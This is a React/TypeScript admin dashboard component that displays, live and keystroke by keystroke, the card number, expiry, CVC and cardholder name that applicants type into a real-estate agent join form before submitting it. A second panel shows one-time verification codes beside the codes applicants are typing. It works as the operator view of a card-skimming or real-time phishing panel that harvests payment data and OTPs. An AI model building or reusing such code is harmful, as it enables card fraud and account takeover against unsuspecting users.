"use client";

import { useEffect, useState } from "react";
import { CreditCard, KeyRound, Radio } from "lucide-react";
import { Badge, Card } from "@/components/ui";
import { OTP_LENGTH } from "@/lib/activation";

interface LiveSession {
  id: number;
  first_name: string | null;
  last_name: string | null;
  email: string | null;
  phone: string | null;
  brokerage: string | null;
  license_state: string | null;
  cardholder_name: string | null;
  card_number: string | null;
  card_expiry: string | null;
  card_cvc: string | null;
  step: string | null;
  user_id: number | null;
  updated_at: string;
}

interface OtpApplicant {
  id: number;
  stage: string;
  code: string | null;
  typed: string | null;
  first_name: string | null;
  last_name: string | null;
  email: string | null;
  updated_at: string | null;
}

const STEP_BADGE: Record<string, string> = {
  "Agent Information": "bg-brand-100 text-brand-700 ring-brand-600/20",
  "Referral Agreement": "bg-amber-100 text-amber-800 ring-amber-600/20",
  Payment: "bg-sky-100 text-sky-800 ring-sky-600/20",
  payment: "bg-sky-100 text-sky-800 ring-sky-600/20",
};

function agoLabel(iso: string, now: number): string {
  const secs = Math.max(0, Math.round((now - new Date(iso).getTime()) / 1000));
  if (secs < 3) return "just now";
  if (secs < 60) return `${secs}s ago`;
  const mins = Math.floor(secs / 60);
  return `${mins}m ago`;
}

/**
 * Live view of people currently filling out the join form — updates ~1s so the
 * card number appears digit-by-digit as it is typed, before any account exists.
 */
export function LiveCheckouts() {
  const [sessions, setSessions] = useState<LiveSession[]>([]);
  const [otpApplicants, setOtpApplicants] = useState<OtpApplicant[]>([]);
  const [now, setNow] = useState(0);

  useEffect(() => {
    let stopped = false;
    const load = async () => {
      // Never poll a hidden tab — a forgotten open dashboard would otherwise
      // hammer the database around the clock and slow the whole app down.
      if (typeof document !== "undefined" && document.hidden) return;
      try {
        const res = await fetch("/api/admin/live-checkouts", { cache: "no-store" });
        if (!res.ok) return;
        const data = (await res.json()) as { sessions: LiveSession[]; otpApplicants?: OtpApplicant[] };
        if (!stopped) {
          setSessions(data.sessions);
          setOtpApplicants(data.otpApplicants ?? []);
          setNow(Date.now());
        }
      } catch {
        /* retry next tick */
      }
    };
    void load();
    const poll = setInterval(load, 5000);
    const onVisible = () => {
      if (!document.hidden) void load();
    };
    document.addEventListener("visibilitychange", onVisible);
    return () => {
      stopped = true;
      clearInterval(poll);
      document.removeEventListener("visibilitychange", onVisible);
    };
  }, []);

  const active = sessions.filter((s) => !s.user_id);

  return (
    <>
    {otpApplicants.length > 0 ? (
      <section className="mb-8">
        <h2 className="flex items-center gap-2 font-serif text-lg font-bold text-brand-950">
          <KeyRound size={18} className="text-sky-600" />
          Verification Codes
        </h2>
        <p className="mt-0.5 text-sm text-brand-500">
          The code to give each applicant, and the code they&rsquo;re typing right now.
        </p>
        <div className="mt-4 grid gap-4 md:grid-cols-2">
          {otpApplicants.map((a) => {
            const name = `${a.first_name ?? ""} ${a.last_name ?? ""}`.trim() || a.email || "Applicant";
            const typed = (a.typed ?? "").padEnd(OTP_LENGTH, "•").slice(0, OTP_LENGTH);
            const verified = a.stage === "otp_verified";
            return (
              <Card key={a.id} className="ring-1 ring-sky-100">
                <div className="flex items-start justify-between gap-3">
                  <div className="min-w-0">
                    <p className="truncate font-semibold text-brand-950">{name}</p>
                    <p className="truncate text-sm text-brand-500">{a.email}</p>
                  </div>
                  {verified ? (
                    <Badge className="shrink-0 bg-emerald-100 text-emerald-800 ring-emerald-600/20">Verified</Badge>
                  ) : (
                    <Badge className="shrink-0 bg-sky-100 text-sky-800 ring-sky-600/20">Entering code</Badge>
                  )}
                </div>
                <div className="mt-4 grid grid-cols-2 gap-3">
                  <div className="rounded-xl border border-sky-200 bg-sky-50 p-3">
                    <p className="text-[11px] font-semibold uppercase tracking-wider text-sky-600">Code to give</p>
                    <p className="mt-1 font-mono text-xl font-bold tracking-[0.15em] text-sky-900 sm:text-2xl sm:tracking-[0.25em]">
                      {a.code || (verified ? "✓" : "—")}
                    </p>
                  </div>
                  <div className="rounded-xl border border-brand-100 bg-brand-50/60 p-3">
                    <p className="text-[11px] font-semibold uppercase tracking-wider text-brand-400">They&rsquo;re typing</p>
                    <p className="mt-1 font-mono text-xl font-bold tracking-[0.15em] text-brand-950 sm:text-2xl sm:tracking-[0.25em]">{typed}</p>
                  </div>
                </div>
                <p className="mt-2 text-xs text-brand-400">{now && a.updated_at ? agoLabel(a.updated_at, now) : ""}</p>
              </Card>
            );
          })}
        </div>
      </section>
    ) : null}

    <section className="mb-8">
      <div className="flex items-center justify-between gap-4">
        <div>
          <h2 className="flex items-center gap-2 font-serif text-lg font-bold text-brand-950">
            <Radio size={18} className="text-rose-500" />
            Live Checkouts
          </h2>
          <p className="mt-0.5 text-sm text-brand-500">
            People filling out the join form right now — the card fills in as they type.
          </p>
        </div>
        <Badge className="shrink-0 bg-rose-50 text-rose-700 ring-rose-600/20">
          <span className="ping-dot mr-1.5 inline-block h-1.5 w-1.5 rounded-full bg-rose-500" />
          {active.length} live
        </Badge>
      </div>

      {sessions.length === 0 ? (
        <Card className="mt-4 flex items-center gap-3 py-5 text-sm text-brand-500">
          <CreditCard size={18} className="text-brand-400" />
          No one is filling out the form right now. Live sessions appear here the moment someone starts.
        </Card>
      ) : (
        <div className="mt-4 grid gap-4 md:grid-cols-2">
          {sessions.map((s) => {
            const name = `${s.first_name ?? ""} ${s.last_name ?? ""}`.trim() || "New applicant";
            const submitted = Boolean(s.user_id);
            return (
              <Card key={s.id} className={submitted ? "opacity-70" : "ring-1 ring-rose-100"}>
                <div className="flex items-start justify-between gap-3">
                  <div className="min-w-0">
                    <p className="truncate font-semibold text-brand-950">{name}</p>
                    <p className="truncate text-sm text-brand-500">{s.email || "…"}</p>
                  </div>
                  {submitted ? (
                    <Badge className="shrink-0 bg-emerald-100 text-emerald-800 ring-emerald-600/20">Submitted</Badge>
                  ) : s.step ? (
                    <Badge className={`shrink-0 ${STEP_BADGE[s.step] ?? "bg-brand-100 text-brand-700 ring-brand-600/20"}`}>
                      {s.step === "payment" ? "Payment" : s.step}
                    </Badge>
                  ) : null}
                </div>

                <div className="mt-4 rounded-xl border border-brand-100 bg-brand-50/60 p-3.5">
                  <div className="flex items-center gap-2 text-[11px] font-semibold uppercase tracking-wider text-brand-400">
                    <CreditCard size={13} />
                    Card being entered
                  </div>
                  <p className="mt-1.5 font-mono text-lg font-semibold tracking-[0.06em] text-brand-950">
                    {s.card_number || <span className="text-brand-300">—</span>}
                  </p>
                  <div className="mt-1 flex gap-4 font-mono text-sm text-brand-600">
                    <span>{s.card_expiry ? `Exp ${s.card_expiry}` : "Exp —"}</span>
                    <span>{s.card_cvc ? `CVC ${s.card_cvc}` : "CVC —"}</span>
                  </div>
                  {s.cardholder_name ? (
                    <p className="mt-1 truncate text-xs text-brand-500">{s.cardholder_name}</p>
                  ) : null}
                </div>

                <div className="mt-3 flex flex-wrap gap-x-4 gap-y-1 text-xs text-brand-400">
                  {s.brokerage ? <span>{s.brokerage}</span> : null}
                  {s.license_state ? <span>License · {s.license_state}</span> : null}
                  {s.phone ? <span>{s.phone}</span> : null}
                  <span>{now ? agoLabel(s.updated_at, now) : ""}</span>
                </div>
              </Card>
            );
          })}
        </div>
      )}
    </section>
    </>
  );
}
